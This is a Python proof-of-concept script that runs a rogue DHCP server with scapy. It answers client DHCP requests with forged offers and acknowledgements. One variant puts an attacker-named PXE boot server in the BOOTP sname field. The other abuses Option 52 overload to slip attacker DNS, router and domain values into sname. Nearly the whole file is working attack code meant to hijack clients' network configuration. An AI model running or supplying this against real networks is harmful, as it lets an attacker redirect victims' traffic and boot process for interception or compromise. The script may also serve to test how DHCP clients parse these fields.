#!/usr/bin/env python3
"""
PoC: DHCPACK sname field hijacking — two variants

Case A: sname as PXE boot server name
  - Sets sname to attacker-controlled hostname
  - PXE clients use it as TFTP/boot server

Case B: Option Overload (RFC 2131 §4.1, Option 52)
  - Encodes additional DHCP options INSIDE the sname field
  - Injects attacker DNS/Router via overloaded sname
  - Tests whether clients parse options from sname when Option 52 is present

Attack surface: BOOTP sname field (64 bytes) + Option 52 (Overload)
"""

from scapy.all import *
import struct
import sys
import time

conf.checkIPaddr = False
conf.verb = 0

MALICIOUS_SNAME = b"evil-pxe.attacker.local"
ATTACKER_DNS_FOR_OVERLOAD = None


def detect_interface(target_ip=None):
    for iface in get_if_list():
        if iface == "lo":
            continue
        try:
            addr = get_if_addr(iface)
            if target_ip and addr == target_ip:
                return iface, addr
            if not target_ip and addr and addr != "0.0.0.0" and addr.startswith("10."):
                return iface, addr
        except Exception:
            pass
    return "eth0", get_if_addr("eth0")


def encode_dhcp_option(code, value_bytes):
    """Encode a single DHCP option as TLV."""
    return bytes([code, len(value_bytes)]) + value_bytes


def ip_to_bytes(ip_str):
    return bytes(int(x) for x in ip_str.split("."))


def build_overloaded_sname(attacker_dns_ip, attacker_router_ip):
    """Build a sname field containing encoded DHCP options (Option Overload).

    Encodes into the 64-byte sname field:
      - Option 6 (DNS Server) = attacker DNS IP
      - Option 3 (Router) = attacker router IP
      - Option 15 (Domain Name) = "evil.corp"
      - Option 255 (End)
    """
    opts = b""
    opts += encode_dhcp_option(6, ip_to_bytes(attacker_dns_ip))
    opts += encode_dhcp_option(3, ip_to_bytes(attacker_router_ip))
    opts += encode_dhcp_option(15, b"evil.corp")
    opts += bytes([255])  # End

    if len(opts) > 64:
        print(f"[!] WARNING: overloaded options ({len(opts)} bytes) exceed sname limit (64)")
        opts = opts[:63] + bytes([255])

    return opts.ljust(64, b"\x00")


TARGET_IP = sys.argv[2] if len(sys.argv) > 2 else None
MODE = sys.argv[3] if len(sys.argv) > 3 else "both"  # "A", "B", or "both"
IFACE, SERVER_IP = detect_interface(TARGET_IP)
ATTACKER_DNS_FOR_OVERLOAD = SERVER_IP
ROUTER = SERVER_IP.rsplit(".", 1)[0] + ".1"
OFFERED_IP = SERVER_IP.rsplit(".", 1)[0] + ".50"

ack_sent_a = False
ack_sent_b = False
phase = "A" if MODE in ("A", "both") else "B"


def send_case_a(xid, chaddr, client_mac):
    """Case A: sname as PXE boot server name."""
    global ack_sent_a

    print(f"\n{'='*60}")
    print(f"  Case A: sname = malicious PXE server hostname")
    print(f"{'='*60}")

    offer = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=get_if_hwaddr(IFACE))
        / IP(src=SERVER_IP, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(
            op=2, xid=xid, yiaddr=OFFERED_IP, siaddr=SERVER_IP,
            sname=MALICIOUS_SNAME.ljust(64, b"\x00"),
            chaddr=chaddr,
        )
        / DHCP(options=[
            ("message-type", "offer"),
            ("server_id", SERVER_IP),
            ("lease_time", 300),
            ("subnet_mask", "255.255.255.0"),
            ("router", ROUTER),
            ("name_server", ROUTER),
            ("domain", "legit.local"),
            "end",
        ])
    )
    sendp(offer, iface=IFACE, verbose=False)
    print(f"[+] DHCPOFFER (Case A)")
    print(f"    sname = {MALICIOUS_SNAME.decode()} [ATTACKER PXE SERVER]")


def send_case_a_ack(xid, chaddr, client_mac):
    global ack_sent_a

    ack = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=get_if_hwaddr(IFACE))
        / IP(src=SERVER_IP, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(
            op=2, xid=xid, yiaddr=OFFERED_IP, siaddr=SERVER_IP,
            sname=MALICIOUS_SNAME.ljust(64, b"\x00"),
            chaddr=chaddr,
        )
        / DHCP(options=[
            ("message-type", "ack"),
            ("server_id", SERVER_IP),
            ("lease_time", 300),
            ("subnet_mask", "255.255.255.0"),
            ("router", ROUTER),
            ("name_server", ROUTER),
            ("domain", "legit.local"),
            "end",
        ])
    )
    sendp(ack, iface=IFACE, verbose=False)
    ack_sent_a = True

    print(f"[+] DHCPACK (Case A) sent!")
    print(f"    yiaddr = {OFFERED_IP}")
    print(f"    sname  = {MALICIOUS_SNAME.decode()} [ATTACKER PXE SERVER]")
    print(f"    siaddr = {SERVER_IP}")


def send_case_b(xid, chaddr, client_mac):
    """Case B: Option Overload — options encoded in sname field."""
    global ack_sent_b

    print(f"\n{'='*60}")
    print(f"  Case B: Option Overload — DHCP options in sname")
    print(f"{'='*60}")

    overloaded_sname = build_overloaded_sname(ATTACKER_DNS_FOR_OVERLOAD, SERVER_IP)

    print(f"[*] Overloaded sname contents (hex): {overloaded_sname.hex()}")
    print(f"[*] Decoded options in sname:")
    print(f"      Option 6 (DNS)    = {ATTACKER_DNS_FOR_OVERLOAD}")
    print(f"      Option 3 (Router) = {SERVER_IP}")
    print(f"      Option 15 (Domain)= evil.corp")

    offer = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=get_if_hwaddr(IFACE))
        / IP(src=SERVER_IP, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(
            op=2, xid=xid, yiaddr=OFFERED_IP, siaddr=SERVER_IP,
            sname=overloaded_sname,
            chaddr=chaddr,
        )
        / DHCP(options=[
            ("message-type", "offer"),
            ("server_id", SERVER_IP),
            ("lease_time", 300),
            ("subnet_mask", "255.255.255.0"),
            (52, b"\x02"),  # Option Overload: 2 = sname contains options
            "end",
        ])
    )
    sendp(offer, iface=IFACE, verbose=False)
    print(f"[+] DHCPOFFER (Case B) with Option 52 (Overload=sname)")


def send_case_b_ack(xid, chaddr, client_mac):
    global ack_sent_b

    overloaded_sname = build_overloaded_sname(ATTACKER_DNS_FOR_OVERLOAD, SERVER_IP)

    ack = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=get_if_hwaddr(IFACE))
        / IP(src=SERVER_IP, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(
            op=2, xid=xid, yiaddr=OFFERED_IP, siaddr=SERVER_IP,
            sname=overloaded_sname,
            chaddr=chaddr,
        )
        / DHCP(options=[
            ("message-type", "ack"),
            ("server_id", SERVER_IP),
            ("lease_time", 300),
            ("subnet_mask", "255.255.255.0"),
            (52, b"\x02"),  # Option Overload: 2 = sname contains options
            "end",
        ])
    )
    sendp(ack, iface=IFACE, verbose=False)
    ack_sent_b = True

    print(f"[+] DHCPACK (Case B) with Option Overload sent!")
    print(f"    yiaddr = {OFFERED_IP}")
    print(f"    sname contains encoded options:")
    print(f"      DNS={ATTACKER_DNS_FOR_OVERLOAD}, Router={SERVER_IP}, Domain=evil.corp")


exchange_count = 0


def handle_dhcp(pkt):
    global phase, exchange_count
    if not pkt.haslayer(DHCP):
        return
    opts = {}
    for o in pkt[DHCP].options:
        if isinstance(o, tuple) and len(o) >= 2:
            opts[o[0]] = o[1]

    mt = opts.get("message-type")
    client_mac = pkt[Ether].src
    xid = pkt[BOOTP].xid
    chaddr = pkt[BOOTP].chaddr

    if mt == 1:  # DISCOVER
        print(f"\n[*] DHCPDISCOVER from {client_mac} (xid=0x{xid:08x}) [phase={phase}]")
        if phase == "A":
            send_case_a(xid, chaddr, client_mac)
        elif phase == "B":
            send_case_b(xid, chaddr, client_mac)

    elif mt == 3:  # REQUEST
        print(f"\n[*] DHCPREQUEST from {client_mac} (xid=0x{xid:08x}) [phase={phase}]")
        if phase == "A":
            send_case_a_ack(xid, chaddr, client_mac)
            exchange_count += 1
            if MODE == "both":
                phase = "B"
        elif phase == "B":
            send_case_b_ack(xid, chaddr, client_mac)
            exchange_count += 1


def main():
    timeout = int(sys.argv[1]) if len(sys.argv) > 1 else 30

    print("=" * 60)
    print("  PoC: sname Field Hijacking + Option Overload")
    print(f"  Interface:  {IFACE} ({SERVER_IP})")
    print(f"  Offering:   {OFFERED_IP}")
    print(f"  Mode:       {MODE}")
    if MODE in ("A", "both"):
        print(f"  Case A sname: {MALICIOUS_SNAME.decode()}")
    if MODE in ("B", "both"):
        print(f"  Case B DNS:   {ATTACKER_DNS_FOR_OVERLOAD} (via overloaded sname)")
    print(f"  Timeout:    {timeout}s")
    print("=" * 60)
    print("[*] Waiting for DHCP traffic...\n")

    sniff(
        iface=IFACE,
        filter="udp and (port 67 or port 68)",
        prn=handle_dhcp,
        store=0,
        timeout=timeout,
    )

    print(f"\n[RESULT] Exchanges completed: {exchange_count}")
    if ack_sent_a:
        print("[RESULT] Case A: SUCCESS — sname with malicious PXE server delivered")
    if ack_sent_b:
        print("[RESULT] Case B: SUCCESS — Option Overload with encoded options delivered")
    if not ack_sent_a and not ack_sent_b:
        print("[RESULT] TIMEOUT — no complete DHCP exchange")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
